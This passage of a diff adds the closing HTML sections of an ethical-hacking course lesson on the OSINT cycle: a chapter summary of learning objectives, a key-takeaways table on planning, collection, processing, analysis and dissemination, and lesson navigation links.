+          not a one-time typo, spoof, or decoy before committing operational resources 
+          against it.
+        </div>
+
+        <div class="reminder" style="margin: 15px 0;">
+          <strong>Inside the Adversary Mindset:</strong><br> Successful intelligence 
+          operations are rarely built on a single source. Adversaries continuously 
+          collect, validate, correlate, and refine information until uncertainty is 
+          reduced and operational decisions can be made with confidence.
+        </div>
+      </section>
+
+<!-- ============================================================ -->
+<!-- SECTION: CHAPTER SUMMARY                                     -->
+<!-- ============================================================ -->
+
+<section aria-labelledby="osint-cycle-chapter-summary">
+  <h2 id="osint-cycle-chapter-summary">12. Chapter Summary</h2>
+
+  <p>
+    By completing this chapter you should now be able to:
+  </p>
+
+  <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0;">
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Describe the five phases of the OSINT Cycle.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Planning, Collection, Processing, Analysis, and Dissemination.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Apply the OSINT Cycle to real-world investigations.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Using structured workflows to turn raw data into actionable intelligence.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Execute passive and active collection techniques.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Certificate transparency logs, social media scraping, and metadata extraction.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Process raw data into structured intelligence.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Cleaning, normalizing, tagging, and clustering collected data.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Analyze patterns and relationships in OSINT data.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Timeline construction, link analysis, and threat correlation.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Disseminate findings in a decision-ready format.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">Executive summaries, technical reports, and actionable recommendations.</span></span>
+    </div>
+
+    <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 15px 18px; display: flex; align-items: flex-start; gap: 12px;">
+      <span style="color: #4caf50; font-size: 1.4rem; line-height: 1;">✓</span>
+      <span><strong>Understand how adversaries execute the OSINT Cycle.</strong><br>
+      <span style="color: #aaa; font-size: 0.9rem;">APT operations, vulnerability research, and OPSEC countermeasures.</span></span>
+    </div>
+
+  </div>
+
+  <div class="info-remember" style="margin: 15px 0;">
+    <strong>Why This Matters:</strong>
+    <span style="display: block; margin-top: 5px;">
+      The OSINT Cycle transforms raw public data into decision-grade intelligence. Mastering this 
+      workflow ensures that your investigations are reproducible, defensible, and aligned with 
+      professional intelligence standards. Whether you are conducting reconnaissance, hunting 
+      threats, or building target profiles, the cycle provides the structure that separates 
+      professional intelligence from casual searching.
+    </span>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION: KEY TAKEAWAYS (13)                                   -->
+<!-- ============================================================ -->
+
+<section aria-labelledby="osint-takeaways-final">
+  <h2 id="osint-takeaways-final">13. Key Takeaways</h2>
+
+  <div class="iscsec-table-responsive">
+    <table class="iscsec-table" aria-label="OSINT Key Takeaways">
+      <thead>
+        <tr>
+          <th>Concept</th>
+          <th>Why It Matters</th>
+          <th>Security Impact</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>The OSINT Cycle Is a Process</strong></td>
+          <td>Successful intelligence gathering follows a structured methodology rather than random searching.</td>
+          <td>Produces repeatable, defensible, and higher-quality intelligence.</td>
+        </tr>
+        <tr>
+          <td><strong>Planning Determines Success</strong></td>
+          <td>Clear objectives, scope, and intelligence requirements reduce wasted effort.</td>
+          <td>Improves efficiency while reducing legal, operational, and reporting risks.</td>
+        </tr>
+        <tr>
+          <td><strong>Collection Should Be Purpose-Driven</strong></td>
+          <td>Gathering excessive data creates noise and increases analysis time.</td>
+          <td>Focused collection produces more relevant findings and actionable results.</td>
+        </tr>
+        <tr>
+          <td><strong>Processing Creates Usable Intelligence</strong></td>
+          <td>Raw data often contains duplicates, inaccuracies, and inconsistencies.</td>
+          <td>Structured information supports faster analysis and better decision-making.</td>
+        </tr>
+        <tr>
+          <td><strong>Analysis Turns Information Into Insight</strong></td>
+          <td>Patterns, relationships, and trends are often hidden within collected data.</td>
+          <td>Reveals risks, opportunities, and adversary activity that may otherwise remain unnoticed.</td>
+        </tr>
+        <tr>
+          <td><strong>Dissemination Must Support Decisions</strong></td>
+          <td>Intelligence has limited value if it cannot be understood or acted upon.</td>
+          <td>Enables stakeholders to make informed security, operational, and business decisions.</td>
+        </tr>
+        <tr>
+          <td><strong>Adversaries Follow the Same Cycle</strong></td>
+          <td>Attackers systematically plan, collect, process, and exploit information before launching attacks.</td>
+          <td>Understanding this process helps defenders identify and disrupt reconnaissance activities earlier.</td>
+        </tr>
+        <tr>
+          <td><strong>Intelligence Requires Validation</strong></td>
+          <td>Single-source information may be incomplete, outdated, or intentionally misleading.</td>
+          <td>Cross-validation improves confidence and reduces false assumptions.</td>
+        </tr>
+        <tr>
+          <td><strong>Feedback Improves Future Operations</strong></td>
+          <td>Every intelligence cycle reveals lessons that refine future collection efforts.</td>
+          <td>Creates more efficient, accurate, and mature intelligence capabilities over time.</td>
+        </tr>
+        <tr>
+          <td><strong>OSINT Supports Both Offensive and Defensive Security</strong></td>
+          <td>The same intelligence process can identify attack opportunities or reveal organizational exposure.</td>
+          <td>Strengthens both security testing and defensive risk management.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="info-remember" style="margin: 15px 0;">
+    <em>RedOps Reminder:</em> Every disciplined recon begins with a plan, not a search bar.
+  </div>
+</section>
+
+      <!-- ============================================================ -->
+      <!-- FLOATING NAVIGATION                                           -->
+      <!-- ============================================================ -->
+
+      <div class="lesson-nav-container">
+        <a href="https://iscsecurity.org/1-ethical-hacking/2-open-source-intelligence/01-what-is-osint" class="nav-link-btn">👈 Back</a>
+        <a href="https://iscsecurity.org/?msopen=/content-library/node/03-osint-threats-and-countermeasures" class="nav-link-btn">Next 👉</a>
+      </div>
+
+  </article>
+</main>
+</body>
+</html>
